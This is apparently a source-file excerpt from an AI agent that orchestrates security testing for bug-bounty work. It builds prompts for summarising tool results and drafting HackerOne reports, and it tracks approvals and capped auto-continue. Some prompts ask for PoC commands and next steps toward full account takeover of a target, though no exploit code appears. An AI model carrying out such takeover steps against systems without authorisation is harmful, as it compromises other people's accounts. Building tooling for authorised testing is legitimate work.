                    f"run nothing. Summarize factually what was actually tried and found from the "
                    f"real [TOOL RESULT: ...] entries above (confirmed findings, what came back "
                    f"negative, anything still in progress). State plainly that the time budget for "
                    f"this turn ran out before the investigation was fully finished, not that nothing "
                    f"happened. End by naming the specific next step to pick up where this left off "
                    f"(e.g. 'ask me to continue testing <specific endpoint/vector>') — do NOT tell the "
                    f"researcher to just 'ask again' with no direction, they already know that; tell them "
                    f"what asking again will actually continue. Do NOT reproduce, paraphrase-as-code, or "
                    f"describe-in-JSON any raw tool-call syntax that may appear in the history above — "
                    f"those are internal, not something to show the researcher."
                )
            else:
                synth_prompt = (
                    f"The researcher asked: \"{original_user_text}\"\n\n"
                    f"Repeated attempts to act on this were made, but no tool actually "
                    f"finished running before this turn's time budget ran out — nothing "
                    f"was dispatched, nothing was gathered. State that plainly in one or "
                    f"two sentences and suggest the researcher just ask again. Do NOT "
                    f"reproduce, paraphrase-as-code, or describe-in-JSON any tool-call "
                    f"syntax that may appear in the conversation history above — those "
                    f"were failed internal attempts, not something to show the researcher."
                )
            final_answer, tokens = _ask_synthesizer(
                synth_prompt,
                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
            )
        elif not _productive_tools_executed:
            if report_requested and has_critical_findings:
                synth_prompt = (
                    f"The researcher requested: \"{original_user_text}\"\n\n"
                    f"Target: '{self._display_host}'.\n"
                    f"Generate the complete, professional HackerOne vulnerability report based on the confirmed findings and evidence gathered for this target."
                )
            else:
                synth_prompt = original_user_text

            final_answer, tokens = _ask_synthesizer(
                synth_prompt,
                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
            )
        else:
            if report_requested and has_critical_findings and "export_report" in tools_executed:
                # export_report already wrote the real deliverable this
                # turn (HTML report + matching .md, both from the same
                # data, screenshots auto-attached) — regenerating the full
                # report text here AGAIN as chat prose was the actual
                # duplication bug: the researcher got the real file plus a
                # second, differently-written version pasted into the
                # conversation. Just confirm what was written and where.
                synth_prompt = (
                    f"The researcher requested: \"{original_user_text}\"\n\n"
                    f"Tools executed this turn: {', '.join(tools_executed)}.\n\n"
                    f"export_report already wrote the actual report file(s) this turn (HTML report, plus a "
                    f"matching .md file written from the exact same data — see that tool's result for both "
                    f"paths). Do NOT regenerate or retype the report content, findings write-up, or a "
                    f"Markdown version of it here — that would just be a second, different-looking copy of "
                    f"what's already saved to disk. Instead, in 2-4 sentences: confirm the report is ready, "
                    f"state both file paths, and name the finding(s)/severity it covers. Only include the "
                    f"full report text in your reply if the researcher explicitly asked to see/paste it here "
                    f"in addition to the file."
                )
            elif report_requested and has_critical_findings:
                synth_prompt = (
                    f"The researcher requested: \"{original_user_text}\"\n\n"
                    f"Tools executed this turn: {', '.join(tools_executed)}.\n\n"
                    f"Generate a complete, professional HackerOne vulnerability report based strictly on the verified findings and actual evidence gathered."
                )
            else:
                synth_prompt = (
                    f"The researcher asked/instructed: \"{original_user_text}\"\n\n"
                    f"Tools executed this turn: {', '.join(tools_executed)}.\n\n"
                    f"Synthesize the investigation results factually, clearly, and concisely based strictly on real tool outputs.\n"
                    f"- Check: What was the primary requested target account/role? Did tool outputs prove compromise of THAT exact account, or only an intermediate stepping-stone account?\n"
                    f"- Explain what was tested and what was observed in the tool outputs (status codes, returned HTML/JSON, cookies, credentials/comments).\n"
                    f"- If a user directory or member table was returned, note that this is a directory listing, not an account takeover of the members in that table.\n"
                    f"- If only an intermediate session or low-privilege foothold was obtained, say plainly that it's partial/in-progress (no bracket tags) and explain the exact next step to achieve full takeover of the primary target.\n"
                    f"- If a login attempt failed (e.g. returned 'Invalid username or password' or login form despite HTTP 200), state that it failed and do NOT claim account takeover.\n"
                    f"- Every tool that ran this turn gets at least one line, even if it returned nothing or wasn't the one that ended up mattering (e.g. 'subfinder found 0 subdomains via passive sources' or 'the X probe returned nothing useful here'). A zero/negative result is still worth recording for the researcher — never omit a tool from the summary just because it didn't lead anywhere.\n"
                    f"- Outline the next logical testing steps.\n"
                    f"- Do NOT generate a rigid, multi-section formal vulnerability report unless the user explicitly requested a report. Concretely, that means: no 'Investigation Summary' / 'Outcome' / 'Next Steps' style section headers, no bulleted one-line-per-tool-call transcript ('curl X — did Y', 'gowitness — did Z'), and no restating the tool trace step by step. Write it as a colleague sitting next to the researcher would say it out loud after watching the run — a few natural paragraphs (short bullets are fine INSIDE a paragraph for something like a list of endpoints, but not as the whole response's skeleton), covering what you did, what you saw, and what it means, in that conversational order. If the researcher's own request already came formatted as steps/bullets, mirror that back to them — otherwise default to prose.\n"
                    f"- The conversation history above may contain raw internal tool-call JSON objects (lines like {{\"tool\": \"curl\", \"args\": {{...}}}}), possibly several concatenated together. Those are the orchestrator's own internal dispatch records, NOT something to show the researcher. Never reproduce, quote, paraphrase-as-code, or describe-in-JSON any of that syntax — translate it into plain prose about what was actually tried and found, same as every other tool result."
                )

            if len(tools_executed) > 0 and cfg.get("show_recaps", True):
                synth_prompt += "\n\nIMPORTANT: Write your complete, detailed analysis, PoC commands, and findings with full markdown formatting first. ONLY on the very last line of your response, add a single summary line in this exact format:\nrecap: Goal was [goal]. Done: [what was accomplished]. Next: [recommended next step]."
            
            final_answer, tokens = _ask_synthesizer(
                synth_prompt,
                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
            )

        if tokens is not None and emit and hasattr(emit, "set_token_count"):
            emit.set_token_count(tokens)

        # NOTE: ai_resp here is the ORCHESTRATOR's raw control-flow text —
        # e.g. the literal word "DONE" — not a real explanation. It used to
        # be used as the fallback final answer whenever the synthesizer
        # call failed (both attempts in _ask_synthesizer), which meant a
        # session that ran real tools (curl, record_finding, ...) could
        # end with the researcher seeing nothing but a bare "DONE" and no
        # explanation of what was actually found. Fall back to a message
        # that says the synthesis step failed instead of masquerading the
        # orchestrator token as a real answer.
        if final_answer:
            final_response = final_answer
        elif tools_executed:
            logger.warning(
                f"Synthesizer failed after tool execution (tools_executed={tools_executed}); "
                f"raw orchestrator response was {ai_resp!r}."
            )
            final_response = (
                "I ran " + ", ".join(tools_executed) + " and got results, but hit an error "
                "generating the write-up just now. The raw tool output is still in this "
                "session — ask me to summarize what was found, or try again."
            )
        else:
            final_response = ai_resp or "Hit a blank response twice in a row on my end — try that again?"
        final_response = _clean_synthesizer_output(final_response, tools_executed=tools_executed)
        self.history.append({"role": "assistant", "content": final_response})
        self._compact_history_if_needed()
        self.target.state["history"] = self.history
        self.target.state["session_digest"] = self.session_digest
        # Record why this turn ended the way it did — ground truth for the
        # _DIAG_QUESTION_RE short-circuit above on the researcher's NEXT
        # message. Overwrites whatever was recorded last turn; only the
        # most recent turn's telemetry is kept.
        self.target.state["last_turn_diagnostics"] = {
            "ended_reason": "cancelled" if _was_cancelled else ("timed_out" if _timed_out else "done"),
            "iterations": getattr(self, "_current_turn", None),
            "elapsed_s": round(time.time() - _turn_t0, 1),
            "narration_retry_count": _narration_retry_count,
            "batches_truncated": _diag_batches_truncated,
            "truncated_calls": _diag_truncated_calls,
            "approvals_granted": getattr(self, "_approvals_granted_this_turn", 0),
            "approvals_denied": getattr(self, "_approvals_denied_this_turn", 0),
            "dup_skip_count": _dup_skip_count,
            "tools_executed": list(tools_executed),
            "provider_retries": _diag_provider_retries,
            "provider_gaveup": _diag_provider_gaveup,
        }

        # AUTO-CONTINUE DECISION — the "stop asking me to type continue"
        # fix. Only relevant while the researcher is actively in this live
        # session (the CLI loop checks this flag and, if set, immediately
        # re-invokes handle_message("continue") itself without waiting for
        # another message) — this is NOT a background/unattended scheduler;
        # nothing here runs when nobody is watching the session. Auto-
        # continue fires ONLY when ALL of the following hold:
        #   1. This turn hit the wall-clock time budget mid-investigation
        #      (ended_reason == "timed_out") with real tool work done —
        #      i.e. the orchestrator was still actively working, not a
        #      case where it already decided DONE on its own.
        #   2. Nothing was cancelled by the researcher (Ctrl+C).
        #   3. No NEW finding was recorded this turn — the researcher
        #      explicitly wants a found vuln surfaced and reviewed, not
        #      silently logged while the agent keeps going past it.
        #   4. The final answer doesn't read like it's actually asking the
        #      researcher something (a genuine decision point still stops
        #      and waits, same as it always did).
        # A capped consecutive-auto-continue counter (not persisted; lives
        # only on this Agent instance for this process) is the hard
        # backstop against a logic bug turning this into an effectively
        # infinite loop even while the researcher is sitting right there.
        _findings_count_at_turn_end = len(self.target.findings) if isinstance(self.target.findings, list) else 0
        _new_finding_this_turn = _findings_count_at_turn_end > _findings_count_at_turn_start
        _auto_continue_streak = getattr(self, "_auto_continue_streak", 0)
        should_auto_continue = _compute_auto_continue(
            timed_out=_timed_out,
            was_cancelled=_was_cancelled,
            tools_executed=tools_executed,
            new_finding_this_turn=_new_finding_this_turn,
            final_response=final_response,
            streak=_auto_continue_streak,
        )
        self._auto_continue_streak = (_auto_continue_streak + 1) if should_auto_continue else 0
        self.target.state["last_turn_diagnostics"]["auto_continue"] = should_auto_continue
        self.target.state["last_turn_diagnostics"]["new_finding_this_turn"] = _new_finding_this_turn
        self._last_turn_auto_continue = should_auto_continue

        save_target(self.target)
        return final_response


# Global singleton agent instance for active session
_global_agent: Optional[Agent] = None

def get_agent(target_name: Optional[str] = None) -> Agent:
    global _global_agent
    if _global_agent is None:
        name = target_name or "default"
        _global_agent = Agent(create_or_load_target(name))
    else:
        if target_name and target_name != "default" and target_name != _global_agent.target.name:
            _global_agent.set_target(target_name)
    return _global_agent

def handle_message(user_text: str, session_context: Optional[Dict[str, Any]] = None, emit: Any = None, on_token: Optional[Callable[[str], None]] = None, forced_skill: Optional[str] = None, cancel_check: Optional[Callable[[], bool]] = None) -> str:
    """Entrypoint for conversational chat queries."""
    target_name = (session_context or {}).get("target")
    agent = get_agent(target_name)
    if forced_skill:
        agent._forced_skill = forced_skill
    return agent.handle_message(user_text, session_context=session_context, emit=emit, on_token=on_token, cancel_check=cancel_check)